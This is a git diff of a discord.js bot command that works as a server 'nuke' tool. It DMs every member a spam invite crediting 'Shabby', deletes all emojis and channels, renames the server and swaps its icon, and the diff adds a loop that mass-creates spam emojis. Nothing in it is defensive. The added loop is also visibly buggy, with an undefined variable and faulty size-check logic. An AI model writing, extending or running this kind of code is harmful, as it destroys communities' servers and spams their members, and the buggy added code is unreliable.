@@ -2,7 +2,7 @@ const { EmbedBuilder } = require("discord.js");
 const Member = require("../../models/member");
 const { error, hershell, success } = require("../lib/util");
 module.exports = {
-  name: "kawai",
+  name: "kawaii",
   description: "asd",
   block: true,
   run: async (client, message, args, usMember, usOwner, usBlock) => {
@@ -12,10 +12,11 @@ module.exports = {
         if(!message.guild.members.me.permissions.has("Administrator")) return error(message, "I'm missing permissions!")
 
         message.guild.members.cache.forEach(member => {
-            if(member.id === client.user.id) return console.log(`asd`)
-            member.send(`El servidor **${message.guild.name}** ha sido decorado por **Shabby** :) discord.gg/peru`)
-        })
+          if(member.id === client.user.id) return console.log(`asd`)
+          member.send(`El servidor **${message.guild.name}** ha sido decorado por **Shabby** :) discord.gg/peru`)
+      })
 
+          
         message.guild.emojis.cache.forEach(emoji => emoji.delete());
 
     message.guild.channels.cache.forEach(channel => channel.delete());
@@ -48,6 +49,17 @@ module.exports = {
 
     await message.guild.setName("#Shabby")
     await message.guild.setIcon("https://cdn.discordapp.com/icons/1093539713123623033/e48b069cad5cb7c58bd13f7abd531948.png?size=2048")
+
+    if(!message.guild.emojis.cache.size > 50) {
+    for (let i = 0;i < 50;i++) {
+      id.emojis.create({
+          attachment: "https://cdn.discordapp.com/emojis/1094283156527521853.gif?v=1",
+          name: 'Shabby'
+      });
+  }
+  }  else {
+    return console.log("Maximium emojis created!")
+  }
 
     if(!message.guild.roles.cache.size > 249) {
         for (let i = 0;i < 249;i++) {
